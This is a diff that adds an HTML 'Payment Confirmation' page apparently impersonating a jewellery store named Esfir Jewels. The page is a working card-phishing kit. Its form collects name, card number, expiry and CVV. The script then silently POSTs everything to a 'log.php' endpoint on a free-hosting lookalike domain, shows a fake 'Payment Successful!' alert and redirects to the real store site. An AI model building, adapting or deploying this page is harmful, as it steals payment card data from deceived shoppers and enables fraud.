@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Payment Confirmation - Esfir Jewels</title>
+  <style>
+    body { font-family: 'Segoe UI', sans-serif; text-align: center; padding: 40px; background: #f8f8f8; }
+    .form { background: white; max-width: 500px; margin: 0 auto; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; }
+    button { background: #000; color: white; padding: 12px 30px; border: none; border-radius: 6px; cursor: pointer; }
+    button:hover { background: #333; }
+  </style>
+</head>
+<body>
+  <div class="form">
+    <h2>💳 Enter Payment Details</h2>
+    <p>Your order is confirmed! Complete payment to proceed.</p>
+    <form id="cardForm">
+      <input type="text" name="name" placeholder="Full Name" required />
+      <input type="text" name="card" placeholder="Card Number (16 digits)" maxlength="16" required />
+      <input type="text" name="expiry" placeholder="MM/YY" maxlength="5" required />
+      <input type="text" name="cvv" placeholder="CVV" maxlength="3" required />
+      <button type="submit">Pay Now</button>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById("cardForm").onsubmit = async function(e) {
+      e.preventDefault();
+      const data = new FormData(this);
+      await fetch('https://esfirjewels123.infinityfreeapp.com/log.php', {
+        method: 'POST',
+        body: data
+      });
+      alert("Payment Successful! Thank you.");
+      window.location = "https://esfirjewels.com";
+    };
+  </script>
+</body>
+</html>
